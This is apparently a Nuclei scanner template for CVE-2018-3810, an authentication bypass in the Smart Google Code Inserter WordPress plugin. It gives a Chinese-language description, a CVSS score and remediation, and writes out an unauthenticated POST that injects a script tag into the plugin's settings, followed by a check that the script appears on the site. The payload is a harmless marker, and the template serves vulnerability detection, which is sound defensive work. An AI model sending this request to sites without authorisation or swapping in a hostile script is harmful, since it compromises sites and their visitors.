id: CVE-2018-3810
info:
  name: Oturia WordPress Smart Google Code Inserter <3.5 - Authentication Bypass
  author:
  - l0ne1y
  tags:
  - wordpress
  - cve
  - cve2018
  - google
  description: |-
    WordPress Plugin Oturia Smart Google Code Inserter 身份验证绕过导致跨站脚本漏洞
    WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台，该平台支持在PHP和MySQL的服务器上架设个人博客网站。Oturia Smart Google Code Inserter plugin是使用在其中的一个元标记验证添加插件。

    WordPress Oturia Smart Google Code Inserter插件3.5之前的版本中存在身份验证绕过漏洞。该漏洞源于smartgooglecode.php文件的‘saveGoogleCode()’函数没有检测当前请求是否来自已授权的用户。攻击者可借助‘sgcgoogleanalytic’参数利用该漏洞更新注入的代码。
  reference:
  - https://www.exploit-db.com/exploits/43420
  - https://nvd.nist.gov/vuln/detail/cve-2018-3810
  - https://wordpress.org/plugins/smart-google-code-inserter/#developers
  - https://limbenjamin.com/articles/smart-google-code-inserter-auth-bypass.html
  severity: critical
  classification:
    cve-id:
    - cve-2018-3810
    cwe-id:
    - cwe-287
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://wordpress.org/plugins/smart-google-code-inserter/#developers
requests:
- path:
  - '{{BaseURL}}/wp-admin/options-general.php?page=smartcode'
  method: POST
  body: sgcgoogleanalytic=<script>console.log("Nuclei - Open-source project [github.com/projectdiscovery/nuclei]")</script>&sgcwebtools=&button=Save+Changes&action=savegooglecode
  headers:
    Content-Type: application/x-www-form-urlencoded
- matchers:
  - type: word
    part: header
    words:
    - text/html
  - type: word
    part: body
    words:
    - <script>console.log("Nuclei - Open-source project [github.com/projectdiscovery/nuclei]")</script>
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}'
  method: GET
